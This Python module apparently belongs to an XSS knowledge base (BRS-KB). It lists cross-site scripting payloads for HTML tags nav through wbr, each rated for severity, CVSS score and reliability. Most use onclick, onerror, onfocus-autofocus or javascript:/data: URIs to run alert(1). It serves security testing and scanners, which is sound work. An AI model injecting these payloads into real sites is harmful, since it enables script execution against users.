#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

HTML Tag XSS Payloads - Basic Tags N-W
"""

from ..models import PayloadEntry


HTML_TAG_PAYLOADS_NW = {
    # Nav tag
    "tag_nav": PayloadEntry(
        payload="<nav onclick=alert(1)>Navigation</nav>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Nav with onclick",
        tags=["html", "nav", "onclick", "html5"],
        reliability="high",
    ),
    # Object tag
    "tag_object_1": PayloadEntry(
        payload="<object data=javascript:alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Object with javascript data",
        tags=["html", "object", "javascript"],
        reliability="medium",
    ),
    "tag_object_2": PayloadEntry(
        payload="<object data=data:text/html,<script>alert(1)</script>>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Object with data URI",
        tags=["html", "object", "data-uri"],
        reliability="medium",
    ),
    # Ol tag
    "tag_ol": PayloadEntry(
        payload="<ol onclick=alert(1)><li>Item</li></ol>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Ol with onclick",
        tags=["html", "ol", "onclick"],
        reliability="high",
    ),
    # Optgroup tag
    "tag_optgroup": PayloadEntry(
        payload="<select><optgroup label=x onclick=alert(1)><option>X</option></optgroup></select>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Optgroup with onclick",
        tags=["html", "optgroup", "onclick"],
        reliability="medium",
    ),
    # Option tag
    "tag_option": PayloadEntry(
        payload="<select><option onclick=alert(1)>X</option></select>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Option with onclick",
        tags=["html", "option", "onclick"],
        reliability="medium",
    ),
    # Output tag
    "tag_output": PayloadEntry(
        payload="<output onclick=alert(1)>Output</output>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Output with onclick",
        tags=["html", "output", "onclick", "html5"],
        reliability="high",
    ),
    # P tag
    "tag_p": PayloadEntry(
        payload="<p onclick=alert(1)>Paragraph</p>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="P with onclick",
        tags=["html", "p", "onclick"],
        reliability="high",
    ),
    # Pre tag
    "tag_pre": PayloadEntry(
        payload="<pre onclick=alert(1)>Preformatted</pre>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Pre with onclick",
        tags=["html", "pre", "onclick"],
        reliability="high",
    ),
    # Progress tag
    "tag_progress": PayloadEntry(
        payload="<progress onclick=alert(1)>50%</progress>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Progress with onclick",
        tags=["html", "progress", "onclick", "html5"],
        reliability="high",
    ),
    # Q tag
    "tag_q": PayloadEntry(
        payload="<q onclick=alert(1)>Quote</q>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Q with onclick",
        tags=["html", "q", "onclick"],
        reliability="high",
    ),
    # Ruby/Rt/Rp tags
    "tag_ruby": PayloadEntry(
        payload="<ruby onclick=alert(1)>漢<rt>かん</rt></ruby>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Ruby with onclick",
        tags=["html", "ruby", "onclick", "html5"],
        reliability="high",
    ),
    # S tag
    "tag_s": PayloadEntry(
        payload="<s onclick=alert(1)>Strikethrough</s>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="S with onclick",
        tags=["html", "s", "onclick"],
        reliability="high",
    ),
    # Samp tag
    "tag_samp": PayloadEntry(
        payload="<samp onclick=alert(1)>Sample</samp>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Samp with onclick",
        tags=["html", "samp", "onclick"],
        reliability="high",
    ),
    # Section tag
    "tag_section": PayloadEntry(
        payload="<section onclick=alert(1)>Section</section>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Section with onclick",
        tags=["html", "section", "onclick", "html5"],
        reliability="high",
    ),
    # Select tag
    "tag_select_1": PayloadEntry(
        payload="<select onfocus=alert(1) autofocus><option>X</option></select>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Select with autofocus onfocus",
        tags=["html", "select", "autofocus", "onfocus"],
        reliability="high",
    ),
    "tag_select_2": PayloadEntry(
        payload="<select onchange=alert(1)><option>1</option><option>2</option></select>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Select with onchange",
        tags=["html", "select", "onchange"],
        reliability="high",
    ),
    # Small tag
    "tag_small": PayloadEntry(
        payload="<small onclick=alert(1)>Small</small>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Small with onclick",
        tags=["html", "small", "onclick"],
        reliability="high",
    ),
    # Source tag
    "tag_source": PayloadEntry(
        payload="<video><source onerror=alert(1) src=x></video>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Source with onerror",
        tags=["html", "source", "onerror"],
        reliability="high",
    ),
    # Span tag
    "tag_span": PayloadEntry(
        payload="<span onclick=alert(1)>Span</span>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Span with onclick",
        tags=["html", "span", "onclick"],
        reliability="high",
    ),
    # Strong tag
    "tag_strong": PayloadEntry(
        payload="<strong onclick=alert(1)>Strong</strong>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Strong with onclick",
        tags=["html", "strong", "onclick"],
        reliability="high",
    ),
    # Sub tag
    "tag_sub": PayloadEntry(
        payload="<sub onclick=alert(1)>Subscript</sub>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Sub with onclick",
        tags=["html", "sub", "onclick"],
        reliability="high",
    ),
    # Summary tag
    "tag_summary": PayloadEntry(
        payload="<details><summary onclick=alert(1)>Summary</summary></details>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Summary with onclick",
        tags=["html", "summary", "onclick", "html5"],
        reliability="high",
    ),
    # Sup tag
    "tag_sup": PayloadEntry(
        payload="<sup onclick=alert(1)>Superscript</sup>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Sup with onclick",
        tags=["html", "sup", "onclick"],
        reliability="high",
    ),
    # Table tags
    "tag_table": PayloadEntry(
        payload="<table onclick=alert(1)><tr><td>Cell</td></tr></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Table with onclick",
        tags=["html", "table", "onclick"],
        reliability="high",
    ),
    "tag_tbody": PayloadEntry(
        payload="<table><tbody onclick=alert(1)><tr><td>X</td></tr></tbody></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Tbody with onclick",
        tags=["html", "tbody", "onclick"],
        reliability="high",
    ),
    "tag_td": PayloadEntry(
        payload="<table><tr><td onclick=alert(1)>Cell</td></tr></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Td with onclick",
        tags=["html", "td", "onclick"],
        reliability="high",
    ),
    "tag_tfoot": PayloadEntry(
        payload="<table><tfoot onclick=alert(1)><tr><td>X</td></tr></tfoot></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Tfoot with onclick",
        tags=["html", "tfoot", "onclick"],
        reliability="high",
    ),
    "tag_th": PayloadEntry(
        payload="<table><tr><th onclick=alert(1)>Header</th></tr></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Th with onclick",
        tags=["html", "th", "onclick"],
        reliability="high",
    ),
    "tag_thead": PayloadEntry(
        payload="<table><thead onclick=alert(1)><tr><th>X</th></tr></thead></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Thead with onclick",
        tags=["html", "thead", "onclick"],
        reliability="high",
    ),
    "tag_tr": PayloadEntry(
        payload="<table><tr onclick=alert(1)><td>Cell</td></tr></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Tr with onclick",
        tags=["html", "tr", "onclick"],
        reliability="high",
    ),
    # Textarea tag
    "tag_textarea_1": PayloadEntry(
        payload="<textarea onfocus=alert(1) autofocus></textarea>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Textarea with autofocus onfocus",
        tags=["html", "textarea", "autofocus", "onfocus"],
        reliability="high",
    ),
    "tag_textarea_2": PayloadEntry(
        payload="<textarea onselect=alert(1)>select me</textarea>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Textarea with onselect",
        tags=["html", "textarea", "onselect"],
        reliability="high",
    ),
    # Time tag
    "tag_time": PayloadEntry(
        payload="<time onclick=alert(1)>2025</time>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Time with onclick",
        tags=["html", "time", "onclick", "html5"],
        reliability="high",
    ),
    # U tag
    "tag_u": PayloadEntry(
        payload="<u onclick=alert(1)>Underline</u>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="U with onclick",
        tags=["html", "u", "onclick"],
        reliability="high",
    ),
    # Ul tag
    "tag_ul": PayloadEntry(
        payload="<ul onclick=alert(1)><li>Item</li></ul>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Ul with onclick",
        tags=["html", "ul", "onclick"],
        reliability="high",
    ),
    # Var tag
    "tag_var": PayloadEntry(
        payload="<var onclick=alert(1)>Variable</var>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Var with onclick",
        tags=["html", "var", "onclick"],
        reliability="high",
    ),
    # Video tag
    "tag_video_1": PayloadEntry(
        payload="<video src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Video with onerror",
        tags=["html", "video", "onerror"],
        reliability="high",
    ),
    "tag_video_2": PayloadEntry(
        payload="<video poster=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Video poster with onerror",
        tags=["html", "video", "poster", "onerror"],
        reliability="medium",
    ),
    "tag_video_3": PayloadEntry(
        payload="<video onloadstart=alert(1)><source src=x></video>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Video with onloadstart",
        tags=["html", "video", "onloadstart"],
        reliability="high",
    ),
    # Wbr tag
    "tag_wbr": PayloadEntry(
        payload="<wbr onclick=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Wbr with onclick",
        tags=["html", "wbr", "onclick"],
        reliability="medium",
    ),
}
